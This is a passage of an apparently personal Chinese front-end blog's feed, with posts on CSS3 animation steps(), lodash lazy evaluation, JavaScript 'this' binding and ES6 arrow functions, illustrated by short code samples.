      &lt;p&gt;在前端的”启蒙”时期就在Yahoo军规里面看到关于网页性能优化的这条军规，在实际的代码书写中，我也一直遵循着这条规则。但是在很长一段时间里，我却不知其真正所以然。每次看到这些页面优化法则的时候，附带的解释总是那么几句，心里总是要要打一个大大的问号。这篇博客，就是梳理我对这个问题的一些了解和思考。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>梳理CSS3-animation的知识点</title>
    <link href="http://summerGreenTea.github.io/2015/12/28/css3-animation/"/>
    <id>http://summerGreenTea.github.io/2015/12/28/css3-animation/</id>
    <published>2015-12-28T03:27:04.000Z</published>
    <updated>2016-03-02T02:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>最初开始学习前端的时候，看懂CSS3的animation的实现的动画效果和编写animation动画代码的简洁名了，惊叹不已。转眼，学习前端已经有一年多的时间，使用CSS3动画也有段时间了，其中的知识点，也有必要做个梳理了。<br><a id="more"></a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CSS3动画在现在的各种节日活动的业务中使用非常普遍，较好的体验效果和比较低的性能损耗让CSS3逐渐的取代了flash来完成一些复杂的动画效果，尤其是移动端，各大平台对CSS3动画的支持也让它成为主流的选择。<br>其实在CSS3中，我们可以通过translate和transform的组合来实现一些简单的动画的效果，但是对于应用场景比较复杂的动画效果，这种组合也就力不从心了。所以在我们在讲到CSS动画的时候大部分都是指CSS3的animation。这篇文章也是如此。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>简单的从w3c上面扒了下CSS3 animation的属性:</p>
<ul>
<li><p>animation-name</p>
</li>
<li><p>animation-duration</p>
</li>
<li><p>animation-delay</p>
</li>
<li><p>animation-iteration-count</p>
</li>
<li><p>animtion-direction</p>
</li>
<li><p>animation-play-state</p>
</li>
<li><p>animation-fill-mode</p>
</li>
<li><p>animation-timing-function</p>
</li>
</ul>
<p>浏览器的支持程度:<br><img src="/2015/12/28/css3-animation/support.png" alt="support.png" title=""></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>上面列举的属性有些真的是太简单了，baid都有一大堆，就别google了，下面介绍的都是自己有时会用错的或者是有些需要注意使用的属性。<br><code>animation-iteration-count</code>是指定动画要执行的次数，可以给定一个大于0的正整数n,或者是infinite,表示无限次播放。<br><code>animation-fill-mode</code>是表示动画之外的状态。怎么理解呢？我个人的理解为就是动画执行完成之后的结束之后的状态，好吧，这么说还是有点绕口，通过各例子来说明下。</p>
<p>查看效果: (在线查看)[<a href="http://sandbox.runjs.cn/show/5lqxwwfn" target="_blank" rel="external">http://sandbox.runjs.cn/show/5lqxwwfn</a>]</p>
<p><code>animation-play-state</code>是指定animation的执行状态的。它有两个可选值running和pause。它们分别表示动画的执行态和暂停态，默认是running。</p>
<p><code>animation-timing-function</code>是<strong>检索或设置</strong>动画的过度类型，这是官方版的解释，简单的所就是动画执行的速率，这里面有什么ease、ease-in等等的，还可以指定三次贝塞尔曲线函数来作为值。</p>
<p>animation根具所给定的值来决定动画在执行时间内的运动速率轨迹。这里值得一提是一个叫做steps(number, [start|end])的函数值。在W3CSchool的介绍文档里面并没有发现有这个值的介绍，但是在实际运用中，却发现了很多steps的运用场景，所以，这里重点提一下。<br>文档上称之为阶跃函数(stepping function)。step函数可以接受两个值来作为参数，第一个是一个数值(大于0的正整数)来指定在每个关键帧之间所发生的阶跃次数;第二个是一个可选值，指定的值可以是end或者start，分别表示在阶跃间隔的开始和结束发生阶跃变化。<br>这么说还是不太好理解，我们用代码来描述下:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.step</span> &#123;</div><div class="line">	<span class="attribute">animation-name</span>: step;</div><div class="line">	<span class="attribute">animation-duration</span>: <span class="number">10s</span>;</div><div class="line">	<span class="attribute">animation-timing-function</span>: <span class="built_in">steps</span>(3, end);</div><div class="line">	<span class="attribute">animation-iteration-count</span>: infinite;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@<span class="keyword">keyframes</span> step &#123;</div><div class="line">	0% &#123;</div><div class="line">		<span class="attribute">background</span>: red;</div><div class="line">	&#125;</div><div class="line">	100% &#123;</div><div class="line">		<span class="attribute">background</span>: black;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>效果查看: (查看效果)[<a href="http://sandbox.runjs.cn/show/cstdcahv" target="_blank" rel="external">http://sandbox.runjs.cn/show/cstdcahv</a>]<br>我们发现动画帧的变化跳过了黑色的那个关键帧。如果把steps的第二个参数该为start,那么相应的显示为红色的那个关键帧也会被直接跳过不显示。</p>
<p>我们用张W3C上的图来解释下上面出现结果的原因:</p>
<img src="/2015/12/28/css3-animation/step.png" alt="step.png" title="">
<p>我们可以根据上面的实例代码总结出来,steps的第一个参数是把keyframes中指定的关键帧间又做了个切分，第二个参数是更具第一个参数对切分后的总关键帧数来做起点帧或终点帧的跳过。</p>
<p><strong>steps的第一个参数是作用于keysframe的两个关键帧之间的，而不是整个keyframes</strong><br>这点是个要认真注意的误区。<br>比如说，上面的代码中，我们给steps的第一个参数的值为3，那么step的keyframes就被划分为0%, 50%, 100%三个关键帧。如果上面的step的keyframes改为:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">keyframes</span> step &#123;</div><div class="line">	0% &#123;</div><div class="line">		<span class="attribute">background</span>: red;</div><div class="line">	&#125;</div><div class="line">	50% &#123;</div><div class="line">		<span class="attribute">background</span>: green;</div><div class="line">	&#125;</div><div class="line">	100% &#123;</div><div class="line">		<span class="attribute">background</span>: black;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>那么他的关键帧切分就为：0%, 25%, 50%, 75%, 100%。确保在keyframes中定义的两个关键帧之间切分后能表示为3个关键帧。</p>
<p>animation-timing-function还可以指定为step-start或step-end，它们等同于steps(1, start)和steps(1, end);</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>本来是想好好写下animation的一些知识点的，但是写完之后发现这篇文章感觉写的有点打酱油的味道了。但是还是作为一次小小的知识总结来写吧！虽说不够详细，但是也是个人对于一些基础知识点的把握程度来进行梳理，有些就一笔带过，有的就讲下自己的理解。<br>日后如果发现关于CSS3 animation的有趣的知识点的话，还是会再补充的。  ~~~完。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最初开始学习前端的时候，看懂CSS3的animation的实现的动画效果和编写animation动画代码的简洁名了，惊叹不已。转眼，学习前端已经有一年多的时间，使用CSS3动画也有段时间了，其中的知识点，也有必要做个梳理了。&lt;br&gt;
    
    </summary>
    
    
      <category term="CSS3" scheme="http://summerGreenTea.github.io/tags/CSS3/"/>
    
      <category term="animation" scheme="http://summerGreenTea.github.io/tags/animation/"/>
    
  </entry>
  
  <entry>
    <title>javascript工具库-lodash.js</title>
    <link href="http://summerGreenTea.github.io/2015/12/25/lodash/"/>
    <id>http://summerGreenTea.github.io/2015/12/25/lodash/</id>
    <published>2015-12-25T12:54:39.000Z</published>
    <updated>2016-05-19T14:29:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>如果你曾经使用过<strong>underscore</strong>,那么你一定会喜欢今天我要介绍的<strong>lodash</strong>。<br><a id="more"></a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>lodash</strong>起初是由<strong>underscore</strong>演变而来的。因为与underscore的其他贡献者意见相斥，于是乎lodash的开发者就更具自己的理解，开发出lodash这个javascript工具库。</p>
<p>于underscore一样，lodash也沿用了 _ 作为全局访问对象来对工具库函数api的快速访问。</p>
<p>最新版的lodash是4.0版本，比较重要的改变是这个版本也是不再对IE6-8的支持，相关的信息可以<a href="https://github.com/lodash/lodash/wiki/Changelog" target="_blank" rel="external">点击查看</a>.</p>
<h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>想对比与underscore，lodash的带给我的惊喜可不止是一点点。</p>
<h3 id="API文档"><a href="#API文档" class="headerlink" title="API文档"></a>API文档</h3><p>早些时候，当我发现lodash这个工具库的之前，我还是一直使用underscore作为必备首选。但是当我查看了lodash的文档和官方介绍后，毅然的决定抛弃underscore。</p>
<p>单方面的个人感受，当我查看相关api文档时，lodash的文档着实详细易看。参数的类型描述、返回结果的类型和给的示例都非常详细，对比与我这个写代码几乎不写注释的人来说，结结实实的打脸啊。</p>
<h3 id="延迟计算"><a href="#延迟计算" class="headerlink" title="延迟计算"></a>延迟计算</h3><p>lodash的执行效率则是最受好评的一个点。lodash的作者也提到了，lodash的最初目标是提供更多的”一致的跨浏览器的行为，并改善性能”。lodash采用的延迟计算的策略，具体是怎么个实现方式呢，我们俩看一段代码:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function priceLt(x) &#123;</div><div class="line">   <span class="keyword">return</span> function(item) &#123; <span class="keyword">return</span> item.price &lt; x; &#125;;</div><div class="line">&#125;</div><div class="line">var gems = [</div><div class="line">   &#123; <span class="string">name:</span> <span class="string">'Sunstone'</span>, <span class="string">price:</span> <span class="number">4</span> &#125;, &#123; <span class="string">name:</span> <span class="string">'Amethyst'</span>, <span class="string">price:</span> <span class="number">15</span> &#125;,</div><div class="line">   &#123; <span class="string">name:</span> <span class="string">'Prehnite'</span>, <span class="string">price:</span> <span class="number">20</span>&#125;, &#123; <span class="string">name:</span> <span class="string">'Sugilite'</span>, <span class="string">price:</span> <span class="number">7</span>  &#125;,</div><div class="line">   &#123; <span class="string">name:</span> <span class="string">'Diopside'</span>, <span class="string">price:</span> <span class="number">3</span> &#125;, &#123; <span class="string">name:</span> <span class="string">'Feldspar'</span>, <span class="string">price:</span> <span class="number">13</span> &#125;,</div><div class="line">   &#123; <span class="string">name:</span> <span class="string">'Dioptase'</span>, <span class="string">price:</span> <span class="number">2</span> &#125;, &#123; <span class="string">name:</span> <span class="string">'Sapphire'</span>, <span class="string">price:</span> <span class="number">20</span> &#125;</div><div class="line">];</div><div class="line"></div><div class="line">var chosen = _(gems).filter(priceLt(<span class="number">10</span>)).take(<span class="number">3</span>).value();</div></pre></td></tr></table></figure>
<p>它的运行示意图是:<br><img src="/2015/12/25/lodash/lodash-naive.gif" alt="lodash-naive.gif" title=""></p>
<p>上面一共读取了8个元素，然后我们取出我们需要的3个元素。不难发现，其实我们只需要读取前5个元素，就能找到我们想要的那3个结果。那么它原本应该的结果应该是:</p>
<img src="/2015/12/25/lodash/grafika.gif" alt="grafika.gif" title="">
<p>那么延迟计算的特点在于，它将我们在链式执行筛选函数的条件都延迟到最后一个筛选条件一并执行(这些筛选条件必须连续)，这个有点类似于浏览器对repaint/reflow的优化所干的事。<br>上面代码用伪代码就可以近似表示为:</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">var</span> takeNum = <span class="number">3</span>, result = [];</div><div class="line"><span class="keyword">for</span>(<span class="built_in">var</span> i = <span class="number">0</span>, len = gems.<span class="built_in">length</span>; i &lt; len; i++) &#123;</div><div class="line">	<span class="keyword">if</span>(priceLt(gems[i])) &#123;</div><div class="line">		reuslt.<span class="built_in">push</span>(gems[i]);</div><div class="line">		<span class="keyword">if</span>(reuslt.<span class="built_in">length</span> == <span class="number">3</span>) &#123;</div><div class="line">			<span class="built_in">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>关于lodash延迟计算的一些讲解，我觉得<a href="http://filimanjaro.com/blog/2014/introducing-lazy-evaluation/" target="_blank" rel="external">How to Speed Up Lo-Dash ×100? Introducing Lazy Evaluation.</a>这篇文章讲的很有意识，作者的语言和理解比较易懂。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实也可以挑一些有特点的api来适当的说明下lodash的api上的特点，但是个人觉得再怎么将还不如翻一翻官方文档，之前也说到了lodash的官方文档带给我的感受了。<br>在知乎上，很多大牛都觉的underscore的源码很是值得一读和重新实现，但现在觉得lodash的源码更是值得细细专研下(未压缩版的lodash源码的注释意识十分详细)。代码规范、如何实现延迟计算、函数式编程的思想，学以致用的最高境界也当要学透。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果你曾经使用过&lt;strong&gt;underscore&lt;/strong&gt;,那么你一定会喜欢今天我要介绍的&lt;strong&gt;lodash&lt;/strong&gt;。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="tools" scheme="http://summerGreenTea.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>javascript中的this指向问题</title>
    <link href="http://summerGreenTea.github.io/2015/12/25/javascript-this/"/>
    <id>http://summerGreenTea.github.io/2015/12/25/javascript-this/</id>
    <published>2015-12-25T11:25:27.000Z</published>
    <updated>2016-03-02T07:25:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>Javascript中的this指向问题应该算是前端面试中最喜欢被问到的问题之一吧！网上相关的文章数不胜数，做为前端新人，自己也稍微的扯下对Javascript中this的指向的一些理解和总结吧！<br><a id="more"></a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当调用一个函数时，这个函数会附加的接受两个参数:arguments(本文不做介绍)和this，大多关于讲解this的文章都是要么说浅了，只是举几个例子就完事了;要么就是说深了，让人看完云里雾里的。我觉得要理入Javascript的this的指向问题，就一定要说到函数的四种调用模式。</p>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>当我们函数只是做为一个函数被调用的时候，函数调用时其内部的this指向(绑定)的是window对象。这个在Javascript被设计之初就被认为是这门语言的一个设计错误。在ES6中，我们可以通过箭头函数来讲函数中的this绑定为函数定义时的上下文。<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_with_function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">call_with_<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>; <span class="comment">//window</span></div></pre></td></tr></table></figure></p>
<p>我们再来看个例子:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> message = <span class="string">'window message'</span>;</div><div class="line"><span class="keyword">var</span> log = &#123;</div><div class="line">	message: <span class="string">'log message:'</span>,</div><div class="line">	output: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">		setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			<span class="built_in">console</span>.log(<span class="keyword">this</span>.message);	</div><div class="line">		&#125;, <span class="number">1000</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// "window message"</span></div></pre></td></tr></table></figure></p>
<p>结果为<code>window message</code>,这个是很多新手都会犯的一个低级失误，<code>setTimeout</code>中的回调函数给人的感觉是通过<code>log.output()</code>方法来调用的，那么在这个方法中，this的指向应该是log。其实不然，我们再深入一步去查看代码会发现，this是在<code>setTimeout</code>中的回调函数中被调用的，也就是说，这种是函数调用模式，所以其中的this应该是指向window全局对象。<br>我们可以通过ES6的箭头函数以及后面要讲到的ES5的bind方法来实现原先想要实现的效果:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> message = <span class="string">'window message'</span>;</div><div class="line"><span class="keyword">var</span> log = &#123;</div><div class="line">	message: <span class="string">'log message:'</span>,</div><div class="line">	output: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">		setTimeout(() =&gt; &#123;</div><div class="line">			<span class="built_in">console</span>.log(<span class="keyword">this</span>.message);</div><div class="line">		&#125;, <span class="number">1000</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">log.output()</div><div class="line"><span class="comment">// "log message"</span></div></pre></td></tr></table></figure></p>
<h3 id="方法调用模式"><a href="#方法调用模式" class="headerlink" title="方法调用模式"></a>方法调用模式</h3><p>在上面的例子中，<code>output</code>是log对象的一个属性，它的值是一个函数表达式，通过<code>log.output()</code>可以执行这个函数表达式所代表的函数，我们把这种函数叫做对象的方法。<br>显然，通过对象调用的方法，其执行时所绑定的this是指向调用这个方法的对象。还是以上面那个例子来说明下:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> message = <span class="string">'window message'</span>;</div><div class="line"><span class="keyword">var</span> log = &#123;</div><div class="line">	message: <span class="string">'log message:'</span>,</div><div class="line">	output: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>.message);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">log.output()</div><div class="line"><span class="comment">// "log message"</span></div></pre></td></tr></table></figure></p>
<p>个人觉得，这种调用模式是最好理解的，所以点到为止。</p>
<h3 id="构造函数调用模式"><a href="#构造函数调用模式" class="headerlink" title="构造函数调用模式"></a>构造函数调用模式</h3><p>构造函数调用在写法上只是在函数调用的基础上加了<code>new</code>关键字，并用变量接受返回的对象。我们可以说一说我们在构造函数前面使用new关键字的作用就能明白其内部的this指向是谁了。<br>当使用new关键字时:</p>
<ul>
<li><p>创建一个新对象</p>
</li>
<li><p>将构造函数的作用域赋给新对象</p>
</li>
<li><p>执行构造函数中的代码</p>
</li>
<li><p>返回新对象<br>简单来说就是使用new关键字会将构造函数的prototype连接到这个新对象上，并把this指向这个对象。要想理解这几个步骤，就要对作用域的相关知识有所了解，可以自行谷歌。</p>
</li>
</ul>
<h3 id="apply、call、bind调用模式"><a href="#apply、call、bind调用模式" class="headerlink" title="apply、call、bind调用模式"></a>apply、call、bind调用模式</h3><p>Javascript的函数存在<strong>定义时上下文</strong>、<strong>执行时上下文</strong>和<strong>函数上下文可改变</strong>的特征。而<code>apply、call、bind</code>这正是利用了函数上下文可改变的特点来给函数内部的this绑定指定对象。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> message = <span class="string">'window message'</span>;</div><div class="line"><span class="keyword">var</span> log = &#123;</div><div class="line">	message: <span class="string">'log message:'</span>,</div><div class="line">	output: <span class="function"><span class="keyword">function</span>(<span class="params">tip1, tip2, tip3</span>) </span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(tip1 + tip2 + tip3 + <span class="keyword">this</span>.message);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">log.output.apply(<span class="built_in">window</span>, [<span class="string">'this '</span>, <span class="string">'is '</span>, <span class="string">'from '</span>])  <span class="comment">// "this is from window message"</span></div><div class="line">log.output.call(<span class="built_in">window</span>, <span class="string">'this '</span>, <span class="string">'is '</span>, <span class="string">'from '</span>)  <span class="comment">// "this is from window message"</span></div></pre></td></tr></table></figure></p>
<p>上面两个例子中output内部的this的指向被我们分别使用apply和call改变了，它们的第一个参数是要绑定给this的值。apply的第二个参数是一个参数数组，是一个要传给调用apply的函数的参数数组。而call是从第二个参数开始的参数就是依次要传入给调用call函数的参数列表。<br>我们要要提到的是ES5函数的bind()方法，它返回一个绑定this到指定对象的新函数，它的第一个参数和apply和call一样，都是要给this绑定的值，后面的参数是要结合新函数所传入的参数一起传入到绑定bind()的函数中。说起来有点绕口，但是理解并不难。它的一个很重要的特征是它返回一个绑定了this的新函数而不是像call和apply一样，绑定并执行。</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>其实要在某个场景下要分辨出当前的this指向的对象是什么，我们只需要仔细的分析下代码，然后找出这个this所在的函数的调用放失是什么就能很好的理解了。其实，这些点并不需要去记忆，结合Javacript的其他知识体系能帮我们更好的掌握这个知识点，说不定还有其他的很多收获。<br>整片文章是以理论体系为主，并没有结合大量的例子来说明，如果有同学或前辈觉得我在某些说法上有错误或不妥的话，欢迎留言。~~Thanks。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Javascript中的this指向问题应该算是前端面试中最喜欢被问到的问题之一吧！网上相关的文章数不胜数，做为前端新人，自己也稍微的扯下对Javascript中this的指向的一些理解和总结吧！&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="this" scheme="http://summerGreenTea.github.io/tags/this/"/>
    
  </entry>
  
  <entry>
    <title>学习ECMAScript6系列之箭头函数</title>
    <link href="http://summerGreenTea.github.io/2015/12/24/es6-arrow-function/"/>
    <id>http://summerGreenTea.github.io/2015/12/24/es6-arrow-function/</id>
    <published>2015-12-24T14:05:17.000Z</published>
    <updated>2016-03-02T02:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Arrow Function</strong>让我想起了python的<code>lambda</code>函数,其实很多语言都支持lambda函数，包括javascript,但是javascript的lambda函数就显得那么的无味。es6的Arrow Function的到来这改变了我们书写函数表达式的方式，也给javascript带来了真正的lambda函数式。<br><a id="more"></a></p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>下面通过一小段简单的代码来体验下 Arrow Function.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'#id'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	$(<span class="keyword">this</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(o);</div><div class="line">	&#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p>这个是在ES5中的一段jQuery写法，但是在ES6中可以这样写：<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'#id'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">	$(<span class="keyword">this</span>).each(o =&gt; &#123;</div><div class="line">		<span class="built_in">console</span>.log(o)</div><div class="line">	&#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p>什么感觉，不知道你是什么感受，反正我很爽，不用写那个又长看起来又很怪(cuo)的<code>function</code>。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>我觉得Arrow Function 算是所有ES6的features中最简单的一个，简单又实用(简直就是我的小水杯)，我都有点按捺不住心中的小激动。还是赶紧快快的进入语法学习吧！<br>Arrow Function 语法可以简单的概括为：</p>
<pre><code>ArrowFunction : ArrowParameters =&gt; ConciseBody
</code></pre><p>相当任性的简洁，用前面的那个栗子来说明一下。<br>click方法闯入的回调函数就是一个<code>ArrowFunction</code>，那么在那么ArrowFunction中的括号就是一个<code>ArrowParameters</code>,那么那个大括号括起来的自然就是<code>ConciseBody</code>(官方给的名称，译为:简洁的函数体)。ArrowParameters和ConciseBody之间用一个<strong>=&gt;</strong>相连。这就组成了一个ArrowFunction。当然还有一些注意点。<br>如果我们的<code>ArrowParameters</code>的参数个数为0，也就是不传入参数的话，那么需要一个空的小括号来表明这是一个无参的函数;如果这个参数为一个，则可以省略小括号；如果参数个数大于一，这一定要使用小括号括起来。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'#id'</span>).hover(() =&gt; &#123;</div><div class="line">	....</div><div class="line">&#125;)  <span class="comment">// 参数个数为0</span></div><div class="line">$(<span class="string">'#id'</span>).hover(e =&gt; &#123;</div><div class="line">	...</div><div class="line">&#125;) <span class="comment">// 参数个数为1，可以省略小括号</span></div><div class="line">$(<span class="string">'.class'</span>).each((ele, index) =&gt; &#123;</div><div class="line">	...</div><div class="line">&#125;) <span class="comment">// 参数为多个，则不可以省略小括号</span></div></pre></td></tr></table></figure></p>
<p>还可以配合reset参数和变量解构一起使用使用:<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> nums = (...<span class="built_in">num</span>) =&gt; nums</div><div class="line">nums(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);   <span class="comment">// [1,2,3,4]</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> person = (&#123;name, age&#125;) =&gt; &#123;</div><div class="line">	<span class="keyword">return</span> <span class="string">'name:'</span> + name + <span class="string">',age:'</span> +age;</div><div class="line">&#125;</div><div class="line">person(&#123;name: <span class="string">'summer'</span>, age: <span class="number">19</span>&#125;) <span class="comment">// name:summer,age:19</span></div></pre></td></tr></table></figure></p>
<p>下面来看看<code>ConciseBody</code>。<br>如果我们的ConciseBody就是我们要返回的值的时候，就可以直接在<code>=&gt;</code>后面加上你要返回的内容。<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">const <span class="keyword">value</span> = o =&gt; o.<span class="keyword">value</span>;</div><div class="line"><span class="comment">//等同于</span></div><div class="line"><span class="keyword">function</span> <span class="keyword">value</span>(o) &#123;</div><div class="line">	<span class="keyword">return</span> o.<span class="keyword">value</span>;</div><div class="line">&#125;.bind(<span class="keyword">this</span>)</div></pre></td></tr></table></figure></p>
<p>如果我们要返回一个对象的话，那么这个对象外要包上一堆小括号，以免js解析器将返回的对象解析成函数体:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> newObject = () =&gt; (&#123;&#125;);</div><div class="line"><span class="comment">//等同于</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">newObject</span><span class="params">()</span> </span>&#123;</div><div class="line">	<span class="keyword">return</span> &#123;&#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="Arrow-Function带来的变化"><a href="#Arrow-Function带来的变化" class="headerlink" title="Arrow Function带来的变化"></a>Arrow Function带来的变化</h3><p>前面我们简单的说了下Arrow Function的一些语法知识点和一些需要注意的点，现在就来分析下 Arrow Function 带来的真正的改变。</p>
<ul>
<li><code>this</code>对象是定义的时候所在的对象，而不是使用时所在的对象<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> handler = &#123;</div><div class="line">	value: <span class="number">1</span>,</div><div class="line">	addValue: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">		setTimeout(() =&gt; &#123;</div><div class="line">			<span class="keyword">this</span>.value ++</div><div class="line">		&#125;, <span class="number">1000</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
